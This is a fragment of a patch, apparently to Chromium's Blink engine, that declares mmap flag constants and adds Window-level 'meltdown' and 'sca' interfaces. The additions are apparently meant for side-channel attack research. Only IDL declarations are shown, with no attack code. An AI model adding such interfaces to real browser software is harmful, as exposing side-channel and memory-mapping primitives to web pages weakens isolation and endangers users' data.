++  readonly attribute unsigned long MAPSHARED;
++  readonly attribute unsigned long MAPSHAREDVALIDATE;
++  readonly attribute unsigned long MAPPRIVATE;
++  readonly attribute unsigned long MAP32BIT;
++  readonly attribute unsigned long MAPANON;
++  readonly attribute unsigned long MAPANONYMOUS;
++  readonly attribute unsigned long MAPDENYWRITE;
++  readonly attribute unsigned long MAPEXECUTABLE;
++  readonly attribute unsigned long MAPFILE;
++  readonly attribute unsigned long MAPFIXED;
++  readonly attribute unsigned long MAPFIXEDNOREPLACE;
++  readonly attribute unsigned long MAPGROWSDOWN;
++  readonly attribute unsigned long MAPHUGETLB;
++  readonly attribute unsigned long MAPHUGEMASK;
++  readonly attribute unsigned long MAPHUGESHIFT;
++  readonly attribute unsigned long MAPLOCKED;
++  readonly attribute unsigned long MAPNOBLOCK;
++  readonly attribute unsigned long MAPNORESERVE;
++  readonly attribute unsigned long MAPPOPULATE;
++  readonly attribute unsigned long MAPSTACK;
++  readonly attribute unsigned long MAPSYNC;
++  readonly attribute unsigned long MAPTYPE;
++};
+diff --git a/third_party/blink/renderer/modules/sca/window_meltdown.idl b/third_party/blink/renderer/modules/sca/window_meltdown.idl
+new file mode 100644
+index 0000000000..d3f44ea37d
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/window_meltdown.idl
+@@ -0,0 +1,7 @@
++// Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++
++[
++    ImplementedAs=DOMWindowMeltdown
++] partial interface Window {
++    readonly attribute Meltdown meltdown;
++};
+diff --git a/third_party/blink/renderer/modules/sca/window_sca.idl b/third_party/blink/renderer/modules/sca/window_sca.idl
+new file mode 100644
+index 0000000000..b9d677e421
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/window_sca.idl
+@@ -0,0 +1,7 @@
++// Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++
++[
++    ImplementedAs=DOMWindowSca
++] partial interface Window {
++    readonly attribute Sca sca;
++};
